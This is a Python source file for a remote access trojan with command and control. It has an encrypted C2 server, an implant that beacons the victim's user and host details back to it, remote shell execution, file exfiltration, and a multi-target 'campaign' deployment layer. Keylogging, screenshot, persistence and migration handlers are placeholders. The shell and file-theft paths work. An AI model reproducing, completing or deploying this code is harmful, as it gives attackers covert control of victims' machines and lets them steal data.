"""
RAT C2 Integration — Remote Access Tool Command & Control

Based on the provided server/client skeleton with Fernet encryption,
length-prefixed messaging, and session management.
"""

import asyncio
import socket
import threading
import json
import base64
import os
import sys
import time
import hashlib
import hmac
import subprocess
import platform
import uuid
import logging
from dataclasses import dataclass, field
from enum import Enum
from typing import Dict, List, Optional, Any, Callable
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

logger = logging.getLogger("rat_c2")


class ImplantStatus(Enum):
    CONNECTING = "connecting"
    CONNECTED = "connected"
    AUTHENTICATED = "authenticated"
    ACTIVE = "active"
    IDLE = "idle"
    DISCONNECTED = "disconnected"
    ERROR = "error"


@dataclass
class Implant:
    """RAT implant/client representation."""
    id: str
    host: str
    port: int
    status: ImplantStatus = ImplantStatus.CONNECTING
    os_info: str = ""
    username: str = ""
    hostname: str = ""
    pid: int = 0
    last_seen: float = field(default_factory=time.time)
    capabilities: List[str] = field(default_factory=list)
    encryption_key: Optional[bytes] = None
    session_data: Dict = field(default_factory=dict)


@dataclass
class RATOperationResult:
    """Result of a RAT operation."""
    success: bool
    implant_id: str
    command: str
    output: str = ""
    error: str = ""
    duration: float = 0.0
    timestamp: float = field(default_factory=time.time)


@dataclass
class RATCampaignResult:
    """Result of a multi-implant campaign."""
    campaign_id: str
    operations: List[RATOperationResult]
    start_time: float
    end_time: float
    total_implants: int
    successful: int
    failed: int


class RATC2Server:
    """RAT Command & Control Server - based on provided skeleton."""

    def __init__(self, host: str = '0.0.0.0', port: int = 443, key: Optional[bytes] = None):
        self.host = host
        self.port = port
        self.implants: Dict[str, Implant] = {}
        self.implant_lock = threading.Lock()

        if key is None:
            self.key = Fernet.generate_key()
        else:
            self.key = key.encode() if isinstance(key, str) else key
        self.cipher = Fernet(self.key)

        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._running = False
        self._server_thread: Optional[threading.Thread] = None
        self._command_handlers: Dict[str, Callable] = {}
        self._register_default_handlers()

    def _register_default_handlers(self):
        """Register default command handlers."""
        self._command_handlers = {
            "sysinfo": self._handle_sysinfo,
            "shell": self._handle_shell,
            "upload": self._handle_upload,
            "download": self._handle_download,
            "screenshot": self._handle_screenshot,
            "keylog_start": self._handle_keylog_start,
            "keylog_stop": self._handle_keylog_stop,
            "persistence": self._handle_persistence,
            "migrate": self._handle_migrate,
            "uninstall": self._handle_uninstall,
        }

    def start(self):
        """Start the C2 server."""
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen(128)
        self._running = True
        logger.info(f"[+] C2 listening on {self.host}:{self.port}")

        self._server_thread = threading.Thread(target=self._accept_loop, daemon=True)
        self._server_thread.start()

    def stop(self):
        """Stop the C2 server."""
        self._running = False
        try:
            self.server_socket.close()
        except Exception:
            pass
        if self._server_thread:
            self._server_thread.join(timeout=5)
        logger.info("[+] C2 server stopped")

    def _accept_loop(self):
        """Accept incoming implant connections."""
        while self._running:
            try:
                client_socket, address = self.server_socket.accept()
                client_thread = threading.Thread(
                    target=self.handle_client,
                    args=(client_socket, address),
                    daemon=True
                )
                client_thread.start()
            except OSError:
                if self._running:
                    logger.error("Accept error")
                break
            except Exception as e:
                logger.error(f"Accept loop error: {e}")

    def handle_client(self, client_socket: socket.socket, address: tuple):
        """Handle individual implant connection."""
        implant_id = None
        try:
            # Receive initial beacon
            data = self.receive_data(client_socket)
            if not data:
                return

            beacon = json.loads(data)
            implant_id = beacon.get("implant_id", str(uuid.uuid4())[:8])

            # Register implant
            implant = Implant(
                id=implant_id,
                host=address[0],
                port=address[1],
                status=ImplantStatus.CONNECTED,
                os_info=beacon.get("os", ""),
                username=beacon.get("user", ""),
                hostname=beacon.get("hostname", ""),
                pid=beacon.get("pid", 0),
            )

            with self.implant_lock:
                self.implants[implant_id] = implant

            logger.info(f"[+] Implant connected: {implant_id} from {address}")

            # Send acknowledgment
            self.send_command(client_socket, {"type": "ack", "implant_id": implant_id})

            # Command loop
            while self._running:
                data = self.receive_data(client_socket)
                if not data:
                    break

                try:
                    request = json.loads(data)
                    response = self._process_request(implant_id, request)
                    self.send_command(client_socket, response)
                except json.JSONDecodeError:
                    self.send_command(client_socket, {"error": "Invalid JSON"})
                except Exception as e:
                    logger.error(f"Command processing error: {e}")
                    self.send_command(client_socket, {"error": str(e)})

        except Exception as e:
            logger.error(f"Client handler error: {e}")
        finally:
            if implant_id:
                with self.implant_lock:
                    if implant_id in self.implants:
                        self.implants[implant_id].status = ImplantStatus.DISCONNECTED
            try:
                client_socket.close()
            except Exception:
                pass

    def _process_request(self, implant_id: str, request: Dict) -> Dict:
        """Process incoming request from implant."""
        req_type = request.get("type", "")

        if req_type == "heartbeat":
            with self.implant_lock:
                if implant_id in self.implants:
                    self.implants[implant_id].last_seen = time.time()
                    self.implants[implant_id].status = ImplantStatus.ACTIVE
            return {"type": "heartbeat_ack"}

        elif req_type == "command_result":
            # Result from implant command execution
            return {"type": "result_ack", "result_id": request.get("result_id")}

        elif req_type == "request_command":
            # Implant requesting queued commands
            return self._get_queued_commands(implant_id)

        return {"error": f"Unknown request type: {req_type}"}

    def _get_queued_commands(self, implant_id: str) -> Dict:
        """Get queued commands for implant (placeholder for command queue)."""
        # In a full implementation, this would check a command queue
        return {"type": "no_commands"}

    def send_command(self, sock: socket.socket, command: Dict):
        """Send encrypted, length-prefixed command."""
        data = json.dumps(command).encode()
        encrypted = self.cipher.encrypt(data)
        length = len(encrypted)
        sock.sendall(length.to_bytes(4, 'big') + encrypted)

    def receive_data(self, sock: socket.socket) -> Optional[bytes]:
        """Receive length-prefixed, encrypted data."""
        length_bytes = sock.recv(4)
        if not length_bytes or len(length_bytes) < 4:
            return None
        length = int.from_bytes(length_bytes, 'big')
        data = b''
        while len(data) < length:
            chunk = sock.recv(min(4096, length - len(data)))
            if not chunk:
                return None
            data += chunk
        try:
            return self.cipher.decrypt(data)
        except Exception:
            return None

    def encrypt(self, data: str) -> bytes:
        """Encrypt string data."""
        if isinstance(data, str):
            data = data.encode()
        return self.cipher.encrypt(data)

    def decrypt(self, data: bytes) -> str:
        """Decrypt data to string."""
        return self.cipher.decrypt(data).decode()

    # Command handlers
    def _handle_sysinfo(self, implant_id: str, args: List) -> Dict:
        return {"command": "sysinfo", "args": []}

    def _handle_shell(self, implant_id: str, args: List) -> Dict:
        cmd = " ".join(args) if args else "whoami"
        return {"command": "shell", "args": [cmd]}

    def _handle_upload(self, implant_id: str, args: List) -> Dict:
        if len(args) < 2:
            return {"error": "Usage: upload <local_path> <remote_path>"}
        return {"command": "upload", "args": args}

    def _handle_download(self, implant_id: str, args: List) -> Dict:
        if len(args) < 1:
            return {"error": "Usage: download <remote_path>"}
        return {"command": "download", "args": args}

    def _handle_screenshot(self, implant_id: str, args: List) -> Dict:
        return {"command": "screenshot", "args": []}

    def _handle_keylog_start(self, implant_id: str, args: List) -> Dict:
        return {"command": "keylog_start", "args": []}

    def _handle_keylog_stop(self, implant_id: str, args: List) -> Dict:
        return {"command": "keylog_stop", "args": []}

    def _handle_persistence(self, implant_id: str, args: List) -> Dict:
        method = args[0] if args else "registry"
        return {"command": "persistence", "args": [method]}

    def _handle_migrate(self, implant_id: str, args: List) -> Dict:
        if len(args) < 1:
            return {"error": "Usage: migrate <pid>"}
        return {"command": "migrate", "args": args}

    def _handle_uninstall(self, implant_id: str, args: List) -> Dict:
        return {"command": "uninstall", "args": [{"confirm": True}]}

    def execute_command(self, implant_id: str, command: str, args: List = None) -> Dict:
        """Queue command for implant execution."""
        with self.implant_lock:
            implant = self.implants.get(implant_id)
            if not implant:
                return {"error": "Implant not found"}

        handler = self._command_handlers.get(command)
        if not handler:
            return {"error": f"Unknown command: {command}"}

        return handler(implant_id, args or [])

    def list_implants(self) -> List[Dict]:
        """List all connected implants."""
        with self.implant_lock:
            return [
                {
                    "id": imp.id,
                    "host": imp.host,
                    "port": imp.port,
                    "status": imp.status.value,
                    "os": imp.os_info,
                    "user": imp.username,
                    "hostname": imp.hostname,
                    "last_seen": imp.last_seen,
                }
                for imp in self.implants.values()
            ]

    def get_implant(self, implant_id: str) -> Optional[Implant]:
        """Get implant by ID."""
        with self.implant_lock:
            return self.implants.get(implant_id)


class RATClient:
    """RAT Client/Implant - based on provided skeleton."""

    def __init__(self, host: str, port: int, key: bytes):
        self.host = host
        self.port = port
        self.cipher = Fernet(key)
        self.socket: Optional[socket.socket] = None
        self.connected = False
        self.implant_id = str(uuid.uuid4())[:8]
        self._running = False
        self._command_queue: asyncio.Queue = asyncio.Queue()
        self._result_handlers: Dict[str, Callable] = {}

    async def connect(self):
        """Connect to C2 server."""
        while self._running:
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.connect((self.host, self.port))
                self.connected = True
                logger.info(f"[+] Connected to C2 at {self.host}:{self.port}")

                # Send beacon
                await self._send_beacon()

                # Start receive loop
                await self._receive_loop()

            except Exception as e:
                logger.error(f"Connection error: {e}")
                self.connected = False
                await asyncio.sleep(30)  # Reconnect delay

    async def _send_beacon(self):
        """Send initial beacon with system info."""
        import getpass
        beacon = {
            "type": "beacon",
            "implant_id": self.implant_id,
            "os": platform.platform(),
            "user": getpass.getuser(),
            "hostname": platform.node(),
            "pid": os.getpid(),
            "arch": platform.architecture()[0],
            "python": platform.python_version(),
        }
        await self._send(beacon)

    async def _send(self, data: Dict):
        """Send encrypted, length-prefixed data."""
        if not self.socket or not self.connected:
            return

        try:
            json_data = json.dumps(data).encode()
            encrypted = self.cipher.encrypt(json_data)
            length = len(encrypted)
            self.socket.sendall(length.to_bytes(4, 'big') + encrypted)
        except Exception as e:
            logger.error(f"Send error: {e}")
            self.connected = False

    async def _receive_loop(self):
        """Receive and process commands from C2."""
        while self.connected and self._running:
            try:
                data = await self._receive()
                if not data:
                    break

                request = json.loads(data)
                await self._process_command(request)

            except json.JSONDecodeError:
                logger.error("Invalid JSON received")
            except Exception as e:
                logger.error(f"Receive error: {e}")
                break

        self.connected = False

    async def _receive(self) -> Optional[bytes]:
        """Receive length-prefixed, encrypted data."""
        if not self.socket:
            return None

        try:
            length_bytes = self.socket.recv(4)
            if not length_bytes or len(length_bytes) < 4:
                return None
            length = int.from_bytes(length_bytes, 'big')
            data = b''
            while len(data) < length:
                chunk = self.socket.recv(min(4096, length - len(data)))
                if not chunk:
                    return None
                data += chunk
            return self.cipher.decrypt(data)
        except Exception:
            return None

    async def _process_command(self, request: Dict):
        """Process command from C2."""
        cmd_type = request.get("command", "")
        args = request.get("args", [])

        result = {"type": "command_result", "result_id": str(uuid.uuid4())[:8]}

        try:
            if cmd_type == "sysinfo":
                result["output"] = self._get_sysinfo()
            elif cmd_type == "shell":
                result["output"] = self._execute_shell(args[0] if args else "whoami")
            elif cmd_type == "upload":
                result["output"] = await self._handle_upload(args)
            elif cmd_type == "download":
                result["output"] = self._handle_download(args[0] if args else "")
            elif cmd_type == "screenshot":
                result["output"] = await self._take_screenshot()
            elif cmd_type == "keylog_start":
                result["output"] = self._start_keylogger()
            elif cmd_type == "keylog_stop":
                result["output"] = self._stop_keylogger()
            elif cmd_type == "persistence":
                result["output"] = self._install_persistence(args[0] if args else "registry")
            elif cmd_type == "migrate":
                result["output"] = self._migrate_process(int(args[0]) if args else 0)
            elif cmd_type == "uninstall":
                result["output"] = self._uninstall()
                self._running = False
            else:
                result["error"] = f"Unknown command: {cmd_type}"

        except Exception as e:
            result["error"] = str(e)

        await self._send(result)

    # Implant capabilities
    def _get_sysinfo(self) -> str:
        return json.dumps({
            "os": platform.platform(),
            "arch": platform.architecture()[0],
            "user": os.getlogin() if hasattr(os, 'getlogin') else "unknown",
            "hostname": platform.node(),
            "pid": os.getpid(),
            "cwd": os.getcwd(),
        })

    def _execute_shell(self, command: str) -> str:
        try:
            result = subprocess.run(
                command, shell=True, capture_output=True, text=True, timeout=60
            )
            return result.stdout + result.stderr
        except subprocess.TimeoutExpired:
            return "Command timed out"
        except Exception as e:
            return f"Error: {e}"

    async def _handle_upload(self, args: List) -> str:
        if len(args) < 2:
            return "Usage: upload <local_path> <remote_path>"
        # In real implant, receive file data and write to remote_path
        return f"Upload ready for {args[1]}"

    def _handle_download(self, remote_path: str) -> str:
        try:
            with open(remote_path, "rb") as f:
                data = base64.b64encode(f.read()).decode()
            return data
        except Exception as e:
            return f"Error: {e}"

    async def _take_screenshot(self) -> str:
        # Placeholder - would use PIL or platform-specific capture
        return "Screenshot capability not implemented"

    def _start_keylogger(self) -> str:
        return "Keylogger started (placeholder)"

    def _stop_keylogger(self) -> str:
        return "Keylogger stopped (placeholder)"

    def _install_persistence(self, method: str) -> str:
        methods = {
            "registry": "Registry Run key persistence",
            "scheduled_task": "Scheduled Task persistence",
            "service": "Windows Service persistence",
            "startup_folder": "Startup folder persistence",
            "cron": "Cron job persistence (Linux)",
            "systemd": "Systemd service persistence (Linux)",
        }
        return methods.get(method, f"Unknown persistence method: {method}")

    def _migrate_process(self, pid: int) -> str:
        return f"Process migration to PID {pid} not implemented"

    def _uninstall(self) -> str:
        return "Uninstalling implant..."

    def start_background(self):
        """Start client in background thread."""
        self._running = True
        thread = threading.Thread(target=lambda: asyncio.run(self.connect()), daemon=True)
        thread.start()
        return thread

    def stop(self):
        """Stop client."""
        self._running = False
        self.connected = False
        if self.socket:
            try:
                self.socket.close()
            except Exception:
                pass


class RATIntegration:
    """Integration layer for RAT C2 with Raphael harness."""

    def __init__(self, config: Dict):
        self.config = config
        self.server: Optional[RATC2Server] = None
        self.clients: Dict[str, RATClient] = {}
        self.campaigns: Dict[str, RATCampaignResult] = {}

    async def start_server(self, host: str = "0.0.0.0", port: int = 443, key: Optional[bytes] = None) -> Dict:
        """Start C2 server."""
        if self.server:
            return {"error": "Server already running"}

        self.server = RATC2Server(host, port, key)
        self.server.start()
        return {"status": "started", "host": host, "port": port}

    async def stop_server(self) -> Dict:
        """Stop C2 server."""
        if self.server:
            self.server.stop()
            self.server = None
            return {"status": "stopped"}
        return {"error": "No server running"}

    async def deploy_implant(self, target: str, port: int, key: bytes) -> Dict:
        """Deploy implant to target (placeholder for actual deployment)."""
        # This would use exploitation frameworks to deploy the implant
        client = RATClient(target, port, key)
        thread = client.start_background()

        self.clients[client.implant_id] = client
        return {
            "implant_id": client.implant_id,
            "target": target,
            "port": port,
            "status": "deploying",
        }

    async def execute_command(self, implant_id: str, command: str, args: List = None) -> RATOperationResult:
        """Execute command on implant."""
        start = time.time()
        if self.server:
            result = self.server.execute_command(implant_id, command, args)
            return RATOperationResult(
                success="error" not in result,
                implant_id=implant_id,
                command=command,
                output=result.get("output", ""),
                error=result.get("error", ""),
                duration=time.time() - start,
            )
        elif implant_id in self.clients:
            # Direct client communication
            client = self.clients[implant_id]
            # Queue command for client
            return RATOperationResult(
                success=True,
                implant_id=implant_id,
                command=command,
                output="Command queued",
                duration=time.time() - start,
            )
        return RATOperationResult(
            success=False,
            implant_id=implant_id,
            command=command,
            error="Implant not found",
            duration=time.time() - start,
        )

    async def run_campaign(
        self,
        targets: List[Dict],
        commands: List[Dict],
        key: bytes
    ) -> RATCampaignResult:
        """Run multi-target campaign."""
        campaign_id = str(uuid.uuid4())[:8]
        start_time = time.time()
        operations = []

        for target_info in targets:
            target = target_info.get("host")
            port = target_info.get("port", 443)

            deploy = await self.deploy_implant(target, port, key)
            implant_id = deploy.get("implant_id")

            if implant_id:
                for cmd in commands:
                    op = await self.execute_command(
                        implant_id,
                        cmd.get("command", ""),
                        cmd.get("args", [])
                    )
                    operations.append(op)

        end_time = time.time()
        campaign = RATCampaignResult(
            campaign_id=campaign_id,
            operations=operations,
            start_time=start_time,
            end_time=end_time,
            total_implants=len(targets),
            successful=sum(1 for o in operations if o.success),
            failed=sum(1 for o in operations if not o.success),
        )
        self.campaigns[campaign_id] = campaign
        return campaign

    def get_campaign(self, campaign_id: str) -> Optional[RATCampaignResult]:
        return self.campaigns.get(campaign_id)

    def list_implants(self) -> List[Dict]:
        if self.server:
            return self.server.list_implants()
        return [
            {
                "id": c.implant_id,
                "host": c.host,
                "port": c.port,
                "status": "connected" if c.connected else "disconnected",
            }
            for c in self.clients.values()
        ]


def create_rat_integration(config: Dict = None) -> RATIntegration:
    """Factory function to create RAT integration."""
    return RATIntegration(config or {})


# CLI entry point
async def main():
    import argparse
    parser = argparse.ArgumentParser(description="RAT C2 Server/Client")
    subparsers = parser.add_subparsers(dest="command")

    # Server
    server_parser = subparsers.add_parser("server", help="Start C2 server")
    server_parser.add_argument("--host", default="0.0.0.0")
    server_parser.add_argument("--port", type=int, default=443)
    server_parser.add_argument("--key", help="Base64 encoded Fernet key")

    # Client
    client_parser = subparsers.add_parser("client", help="Run implant client")
    client_parser.add_argument("host")
    client_parser.add_argument("port", type=int)
    client_parser.add_argument("--key", required=True, help="Base64 encoded Fernet key")

    args = parser.parse_args()

    if args.command == "server":
        key = base64.b64decode(args.key) if args.key else None
        server = RATC2Server(args.host, args.port, key)
        server.start()
        try:
            while True:
                await asyncio.sleep(1)
        except KeyboardInterrupt:
            server.stop()

    elif args.command == "client":
        key = base64.b64decode(args.key)
        client = RATClient(args.host, args.port, key)
        await client.connect()

    else:
        parser.print_help()


if __name__ == "__main__":
    asyncio.run(main())